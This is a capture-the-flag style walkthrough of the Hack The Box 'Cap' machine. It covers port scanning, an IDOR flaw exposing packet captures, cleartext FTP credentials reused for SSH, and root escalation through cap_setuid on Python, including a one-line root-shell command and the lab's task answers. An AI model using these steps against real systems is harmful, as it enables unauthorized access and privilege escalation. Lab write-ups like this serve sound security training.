Hack The Box – Cap
==================

**Difficulty:** Easy

**Target IP:** 10.10.10.X

**Attacker Machine:** Kali Linux

**Objective:** Obtain user and root flags

1 Executive Summary
===================

The Cap machine was compromised by exploiting an **IDOR (Insecure Direct Object Reference)** vulnerability in a web application that exposed sensitive PCAP files. Credentials extracted from a packet capture allowed SSH access as user nathan. Privilege escalation was achieved via a misconfigured binary with Linux capabilities (cap\_setuid) set on /usr/bin/python3.8.

2 Reconnaissance & Enumeration
==============================

2.1 Port Scanning
-----------------

I started with an Nmap scan:

   nmap -sC -sV -oN nmap.txt 10.10.10.X   

### Result:

*   21/tcp – FTP
    
*   22/tcp – SSH
    
*   80/tcp – HTTP
    

**Answer Task 1:**How many TCP ports are open?→ **3**

2.2 Web Enumeration
-------------------

Navigating to the website on port 80 revealed a dashboard with a **“Security Snapshot”** feature.

When generating a snapshot, the browser redirected to:

   /data/[id]   

**Answer Task 2:**What is the \[something\]?→ **data**

3 IDOR Vulnerability Discovery
==============================

Thinking Process
----------------

The URL format:

   /data/1   

The number clearly looked like an ID parameter.When I changed the number manually in the browser:

   /data/0   

I was able to access another scan.

This confirmed an **IDOR vulnerability** — no access control on scan IDs.

**Answer Task 3:**Are you able to get to other users' scans?→ **yes**

4 PCAP Analysis & Credential Extraction
=======================================

4.1 Identify Sensitive PCAP
---------------------------

Testing multiple IDs revealed that:

   /data/0   

contained a PCAP file with interesting traffic.

**Answer Task 4:**What is the ID of the PCAP file that contains sensitive data?→ **0**

4.2 Download & Analyze PCAP
---------------------------

Downloaded the file and opened it in Wireshark:

   wireshark file.pcap   

Filtered by:

  ftp   

I found FTP credentials transmitted in cleartext.

**Answer Task 5:**Which application layer protocol contains the sensitive data?→ **ftp**

Extracted credentials for user nathan.

5 Initial Access
================

5.1 Test FTP Access
-------------------

Logged in via FTP:

  ftp 10.10.10.X   

Credentials worked.

5.2 Password Reuse Testing
--------------------------

Since password reuse is common, I tested SSH:

ssh nathan@10.10.10.X

The same password worked.

**Answer Task 6:**On what other service does this password work?→ **ssh**

6 User Flag
===========

After SSH access:

   ls /home/nathan  cat user.txt   

**User flag obtained.**

7 Privilege Escalation
======================

7.1 Enumeration
---------------

Instead of checking sudo first, I enumerated Linux capabilities:

   getcap -r / 2>/dev/null   

Output included:

  /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip   

This was immediately suspicious.

7.2 Why This is Vulnerable
--------------------------

The capability:

   cap_setuid   

Allows a binary to change its user ID.

If Python can call:

   os.setuid(0)   

It can become root.

7.3 Exploitation
----------------

Executed:

   /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")

Shell changed to:

  root@cap:   

**Answer Task 8:**Full path to vulnerable binary:→ /usr/bin/python3.8

8 Root Flag
===========

  cd /root  cat root.txt   

**Root flag obtained.**

9 Vulnerability Summary
=======================

1 IDOR (Insecure Direct Object Reference)
-----------------------------------------

*   No authorization check on /data/\[id\]
    
*   Allowed access to other users’ PCAP files
    
*   Led to credential disclosure
    

2 Cleartext FTP Credentials
---------------------------

*   Sensitive credentials transmitted unencrypted
    
*   Easily extracted via packet capture
    

3 Password Reuse
----------------

*   Same password used for SSH
    

4 Misconfigured Linux Capability
--------------------------------

*   /usr/bin/python3.8 had cap\_setuid
    
*   Allowed direct root privilege escalation
    

10 Full Attack Chain
====================

1.  Port scan → Identify services
    
2.  Discover web dashboard
    
3.  Identify IDOR in /data/\[id\]
    
4.  Download PCAP with ID = 0
    
5.  Extract FTP credentials
    
6.  Reuse credentials for SSH
    
7.  Enumerate capabilities
    
8.  Exploit cap\_setuid on Python
    
9.  Obtain root
    

Key Lessons Learned
===================

*   Always test ID parameters manually.
    
*   PCAP files often contain credentials.
    
*   Always test password reuse across services.
    
*   getcap -r / is critical during privilege escalation.
    
*   Linux capabilities can be more dangerous than SUID.
